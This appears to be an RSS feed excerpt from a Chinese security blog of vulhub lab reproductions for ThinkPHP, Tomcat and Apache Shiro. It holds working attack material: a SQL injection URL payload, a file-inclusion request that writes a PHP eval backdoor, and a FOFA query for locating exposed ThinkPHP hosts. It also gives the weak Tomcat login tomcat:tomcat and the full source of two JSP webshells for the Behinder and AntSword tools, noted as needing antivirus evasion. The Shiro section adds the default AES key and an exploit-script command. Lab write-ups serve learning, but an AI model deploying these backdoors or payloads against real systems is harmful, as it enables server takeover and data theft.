&lt;p&gt;&lt;a href=&#34;https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html&#34;&gt;https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_58873970/article/details/132711738&#34;&gt;https://blog.csdn.net/qq_58873970/article/details/132711738&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;漏洞复现：-3&#34;&gt;&lt;a href=&#34;#漏洞复现：-3&#34; class=&#34;headerlink&#34; title=&#34;漏洞复现：&#34;&gt;&lt;/a&gt;漏洞复现：&lt;/h2&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.100.134/index.php?ids[]=1&amp;amp;ids[]=2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424234654144.png&#34; alt=&#34;image-20240424234654144&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.100.134/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424235410605.png&#34; alt=&#34;image-20240424235410605&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;lang-rce&#34;&gt;&lt;a href=&#34;#lang-rce&#34; class=&#34;headerlink&#34; title=&#34;lang-rce&#34;&gt;&lt;/a&gt;lang-rce&lt;/h1&gt;&lt;h2 id=&#34;漏洞原理：-4&#34;&gt;&lt;a href=&#34;#漏洞原理：-4&#34; class=&#34;headerlink&#34; title=&#34;漏洞原理：&#34;&gt;&lt;/a&gt;漏洞原理：&lt;/h2&gt;&lt;p&gt;ThinkPHP是一个在中国使用较多的PHP框架。在其6.0.13版本及以前，存在一处本地文件包含漏洞。当多语言特性被开启时，攻击者可以使用lang参数来包含任意PHP文件。&lt;/p&gt;
&lt;p&gt;虽然只能包含本地PHP文件，但在开启了register_argc_argv且安装了pcel&amp;#x2F;pear的环境下，可以包含&amp;#x2F;usr&amp;#x2F;local&amp;#x2F;lib&amp;#x2F;php&amp;#x2F;pearcmd.php并写入任意文件。&lt;/p&gt;
&lt;p&gt;影响版本：&lt;/p&gt;
&lt;p&gt;6.0.1 &amp;lt; ThinkPHP≤ 6.0.13&lt;/p&gt;
&lt;p&gt;5.0.0 &amp;lt; ThinkPHP≤ 5.0.12&lt;/p&gt;
&lt;p&gt;5.1.0 &amp;lt; ThinkPHP≤ 5.1.8&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;利用条件：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1、需要Thinkphp开启多语言功能&lt;/p&gt;
&lt;p&gt;2、安装pear扩展&lt;/p&gt;
&lt;p&gt;3、知道pearcmd.php路径&lt;/p&gt;
&lt;p&gt;4、register_argc_argv&amp;#x3D;on&lt;/p&gt;
&lt;h2 id=&#34;漏洞复现：-4&#34;&gt;&lt;a href=&#34;#漏洞复现：-4&#34; class=&#34;headerlink&#34; title=&#34;漏洞复现：&#34;&gt;&lt;/a&gt;漏洞复现：&lt;/h2&gt;&lt;p&gt;进行漏洞验证&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;/index.php?+config-create+/&amp;amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;amp;/&amp;lt;?=phpinfo();?&amp;gt;+shell.php&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425091852033.png&#34; alt=&#34;image-20240425091852033&#34;&gt;&lt;/p&gt;
&lt;p&gt;传入后门木马，进行连接&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;/index.php?+config-create+/&amp;amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;amp;/&amp;lt;?=phpinfo();eval($_REQUEST[7]);?&amp;gt;+sqrt.php&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425091917700.png&#34; alt=&#34;image-20240425091917700&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;FOFA搜索语法：&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;header&amp;#x3D;”think_lang”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;参考文章：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/Yeoman92/article/details/53064670&#34;&gt;https://blog.csdn.net/Yeoman92/article/details/53064670&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.freebuf.com/sectool/223149.html&#34;&gt;https://www.freebuf.com/sectool/223149.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/solitudi/article/details/113796433&#34;&gt;https://blog.csdn.net/solitudi/article/details/113796433&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_58873970/article/details/132711738&#34;&gt;https://blog.csdn.net/qq_58873970/article/details/132711738&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.freebuf.com/articles/web/289860.html&#34;&gt;https://www.freebuf.com/articles/web/289860.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html&#34;&gt;https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_51922767/article/details/126859373&#34;&gt;https://blog.csdn.net/qq_51922767/article/details/126859373&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/weixin_42253265/article/details/111593955&#34;&gt;https://blog.csdn.net/weixin_42253265/article/details/111593955&lt;/a&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://w-sqrt7.github.io/2024/04/24/vulhub/%E3%80%90vulhub%E3%80%91Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
            <title>【vulhub】Tomcat漏洞复现</title>
            <link>https://w-sqrt7.github.io/2024/04/24/vulhub/%E3%80%90vulhub%E3%80%91Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
            <category>原创</category>
            <category>靶场</category>
            <category>vulhub</category>
            <pubDate>Wed, 24 Apr 2024 10:46:27 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;【vulhub】Tomcat漏洞复现&#34;&gt;&lt;a href=&#34;#【vulhub】Tomcat漏洞复现&#34; class=&#34;headerlink&#34; title=&#34;【vulhub】Tomcat漏洞复现&#34;&gt;&lt;/a&gt;【vulhub】Tomcat漏洞复现&lt;/h1&gt;&lt;p&gt;​	Tomcat是一个开源的、轻量级的应用服务器，是Apache软件基金会的一个项目。它实现了Java Servlet、JavaServer Pages（JSP）和 Java Expression Language（EL）等Java技术，用于支持在Java平台上运行的动态Web应用程序。Tomcat的全名是Apache Tomcat。&lt;/p&gt;
&lt;p&gt;​	Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。Tomcat大都是java代码写的，所以他依赖于java的JDK环境。&lt;/p&gt;
&lt;h1 id=&#34;Tomcat8&#34;&gt;&lt;a href=&#34;#Tomcat8&#34; class=&#34;headerlink&#34; title=&#34;Tomcat8&#34;&gt;&lt;/a&gt;Tomcat8&lt;/h1&gt;&lt;h2 id=&#34;漏洞原理&#34;&gt;&lt;a href=&#34;#漏洞原理&#34; class=&#34;headerlink&#34; title=&#34;漏洞原理&#34;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;Tomcat7+ 弱口令 &amp;amp;&amp;amp; 后台getshell漏洞&lt;/p&gt;
&lt;p&gt;Tomcat版本：8.0&lt;/p&gt;
&lt;p&gt;环境说明&lt;/p&gt;
&lt;p&gt;Tomcat支持在后台部署war文件，可以直接将webshell部署到web目录下。其中，欲访问后台，需要对应用户有相应权限。&lt;/p&gt;
&lt;p&gt;Tomcat7+权限分为：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;manager（后台管理）&lt;ul&gt;
&lt;li&gt;manager-gui 拥有html页面权限&lt;/li&gt;
&lt;li&gt;manager-status 拥有查看status的权限&lt;/li&gt;
&lt;li&gt;manager-script 拥有text接口的权限，和status权限&lt;/li&gt;
&lt;li&gt;manager-jmx 拥有jmx权限，和status权限&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;host-manager（虚拟主机管理）&lt;ul&gt;
&lt;li&gt;admin-gui 拥有html页面权限&lt;/li&gt;
&lt;li&gt;admin-script 拥有text接口权限&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;​	war包是用来进行Web开发时一个网站项目下的所有代码,包括前台HTML&amp;#x2F;CSS&amp;#x2F;JS代码,以及后台JavaWeb的代码。 当开发人员开发完毕时,就会将源码打包给测试人员测试,测试完后若要发布则也会打包成War包进行发布。War包 可以放在Tomcat下的webapps或word目录,当Tomcat服务器启动时，War包即会随之解压源代码来进行自动部署。&lt;/p&gt;
&lt;h2 id=&#34;漏洞复现&#34;&gt;&lt;a href=&#34;#漏洞复现&#34; class=&#34;headerlink&#34; title=&#34;漏洞复现&#34;&gt;&lt;/a&gt;漏洞复现&lt;/h2&gt;&lt;p&gt;首先尝试利用弱口令（tomcat:tomcat）登录到后台，登入后台可以发现一个文件上传点，用于上传war包的，以此为基础，文件上传后门木马进行连接&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/24/vulhub/%E3%80%90vulhub%E3%80%91Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/24/vulhub/%E3%80%90vulhub%E3%80%91Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/11.png&#34; alt=&#34;11&#34;&gt;&lt;/p&gt;
&lt;p&gt;需要准备好恶意代码，要免杀处理后的木马&lt;/p&gt;
&lt;p&gt;如冰蝎可以连接成功的木马（.jsp）（密码rebeyond）（蚁剑无法连接该木马，原因未了解）&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;%@page import=&amp;quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&amp;quot;%&amp;gt;&amp;lt;%!class U extends ClassLoader&amp;#123;U(ClassLoader c)&amp;#123;super(c);&amp;#125;public Class g(byte []b)&amp;#123;return super.defineClass(b,0,b.length);&amp;#125;&amp;#125;%&amp;gt;&amp;lt;%if (request.getMethod().equals(&amp;quot;POST&amp;quot;))&amp;#123;String k=&amp;quot;e45e329feb5d925b&amp;quot;;/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue(&amp;quot;u&amp;quot;,k);Cipher c=Cipher.getInstance(&amp;quot;AES&amp;quot;);c.init(2,new SecretKeySpec(k.getBytes(),&amp;quot;AES&amp;quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&amp;#125;%&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;如蚁剑可以连接成功的木马（.jsp）（密码passwd）（冰蝎无法连接该木马，原因未了解）&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;%!&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    class U extends ClassLoader &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        U(ClassLoader c) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            super(c);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        public Class g(byte[] b) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            return super.defineClass(b, 0, b.length);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    public byte[] base64Decode(String str) throws Exception &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        try &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            Class clazz = Class.forName(&amp;quot;sun.misc.BASE64Decoder&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            return (byte[]) clazz.getMethod(&amp;quot;decodeBuffer&amp;quot;, String.class).invoke(clazz.newInstance(), str);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; catch (Exception e) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            Class clazz = Class.forName(&amp;quot;java.util.Base64&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            Object decoder = clazz.getMethod(&amp;quot;getDecoder&amp;quot;).invoke(null);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            return (byte[]) decoder.getClass().getMethod(&amp;quot;decode&amp;quot;, String.class).invoke(decoder, str);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;%&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;%&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    String cls = request.getParameter(&amp;quot;passwd&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if (cls != null) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;%&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;将木马压缩为.zip文件，然后再将文件后缀更改为.war后进行上传，观察发现上传成功（这里就先上传一个简单的一句话php木马）&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/24/vulhub/%E3%80%90vulhub%E3%80%91Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
&lt;p&gt;进入对应目录查看，可以发现刚才上传的一句话木马被处理掉了，也就无法正常进行连接，所以需要进行免杀处理。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/24/vulhub/%E3%80%90vulhub%E3%80%91Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
&lt;p&gt;这次上传蚁剑可以连接的木马进行同上的操作后上传，并尝试连接，发现可以连接成功。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/24/vulhub/%E3%80%90vulhub%E3%80%91Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
&lt;p&gt;同样，也可以上传一个冰蝎可以连接的木马，并尝试连接，发现可以连接成功。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/24/vulhub/%E3%80%90vulhub%E3%80%91Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://w-sqrt7.github.io/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/</guid>
            <title>【vulhub】Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）</title>
            <link>https://w-sqrt7.github.io/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/</link>
            <category>原创</category>
            <category>靶场</category>
            <category>vulhub</category>
            <pubDate>Thu, 18 Apr 2024 23:31:13 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;【vulhub】Apache-Shiro-1-2-4反序列化漏洞（CVE-2016-4437）&#34;&gt;&lt;a href=&#34;#【vulhub】Apache-Shiro-1-2-4反序列化漏洞（CVE-2016-4437）&#34; class=&#34;headerlink&#34; title=&#34;【vulhub】Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）&#34;&gt;&lt;/a&gt;【vulhub】Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）&lt;/h1&gt;&lt;p&gt;​	Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。&lt;/p&gt;
&lt;p&gt;​	Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。&lt;/p&gt;
&lt;h2 id=&#34;漏洞原理&#34;&gt;&lt;a href=&#34;#漏洞原理&#34; class=&#34;headerlink&#34; title=&#34;漏洞原理&#34;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;在反序列化时，没有对其进行过滤，所以如果传入恶意代码将会造成安全问题&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;在 1.2.4 版本前，是默认ASE秘钥，Key: kPH+bIxk5D2deZiIxcaaaA&amp;#x3D;&amp;#x3D;，可以直接反序列化执行恶意代码。&lt;/strong&gt;而在1.2.4之后，ASE秘钥就不为默认了，需要获取到Key才可以进行渗透，这个密钥也可能会被爆破出来，从而被攻击者利用构造payload。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;具体流程&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Apache Shiro默认使用CookieRememberMeManager。其是：得到rememberMe的cookie值–&amp;gt;Base64解码–&amp;gt;AES解密–&amp;gt;反序列化。&lt;/p&gt;
&lt;p&gt;如果用户登录时勾选了rememberMe选项。用户的请求数据包中将会在cookie字段多出一段数据，这一段数据包含了用户的身份信息，且是经过加密的。&lt;/p&gt;
&lt;p&gt;加密的过程是：用户信息&amp;#x3D;&amp;gt;序列化&amp;#x3D;&amp;gt;AES加密（密钥key）&amp;#x3D;&amp;gt;base64编码&amp;#x3D;&amp;gt;添加到RememberMe Cookie字段。勾选记住密码之后，下次登录时，服务端会根据客户端请求包中的cookie值进行身份验证，无需登录即可访问。服务端处理cookie的流程：取出请求包中rememberMe的cookie值 &amp;#x3D;&amp;gt; Base64解码&amp;#x3D;&amp;gt;AES解密（密钥key）&amp;#x3D;&amp;gt;反序列化。&lt;/p&gt;
&lt;p&gt;攻击者直接就可以用这个密钥实现上述加密过程，在Cookie字段写入想要服务端执行的恶意代码，最后服务端在对cookie进行解密的时候（反序列化后）就会执行恶意代码。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-18%20003118.png&#34; alt=&#34;屏幕截图 2024-04-18 003118&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;影响版本&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Apache Shiro &amp;lt;&amp;#x3D;1.2.4&lt;/p&gt;
&lt;p&gt;&lt;code&gt;shiro特征&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;首先需要判断登录页面是否使用了shiro框架进行身份验证、授权、密码学和会话管理。&lt;/p&gt;
&lt;p&gt;判断方法：进行登录操作时勾选上remember me（记住密码选项），抓包并观察，请求报文中是否有rememberme 字段，响应报文中是否有Set-cookie:rememberMe&amp;#x3D;deleteMe字段。&lt;/p&gt;
&lt;p&gt;如果登录失败且勾选了remember选项，响应报文中有Set-cookie:rememberMe&amp;#x3D;deleteMe；当登录成功，且勾选了remember选项，其响应报文如下图，还会有rememberMe字段，之后的所有请求中Cookie都会有rememberMe字段。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-17%20234618.png&#34; alt=&#34;屏幕截图 2024-04-17 234618&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;漏洞验证&#34;&gt;&lt;a href=&#34;#漏洞验证&#34; class=&#34;headerlink&#34; title=&#34;漏洞验证&#34;&gt;&lt;/a&gt;漏洞验证&lt;/h2&gt;&lt;p&gt;利用脚本或工具进行验证&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python2 shiro_exploit.py -u http://192.168.100.134:8080&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418163349162.png&#34; alt=&#34;image-20240418163349162&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418163332946.png&#34; alt=&#34;image-20240418163332946&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/image-20240418163611522.png&#34; alt=&#34;image-20240418163611522&#34;&gt;&lt;/p&gt;
&lt;p&gt;成功获取到AES密钥kPH+bIxk5D2deZiIxcaaaA&amp;#x3D;&amp;#x3D;，说明漏洞存在。&lt;/p&gt;
&lt;p&gt;利用dnslog或collaborator进一步验证&lt;/p&gt;
